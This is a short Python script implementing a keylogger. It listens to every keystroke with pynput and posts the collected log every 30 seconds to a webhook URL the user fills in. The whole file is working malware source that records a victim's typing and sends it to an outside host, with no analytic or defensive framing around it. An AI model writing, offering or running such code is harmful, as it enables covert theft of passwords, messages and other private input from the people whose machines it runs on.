from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener

WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE' #put your webhook url here
TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
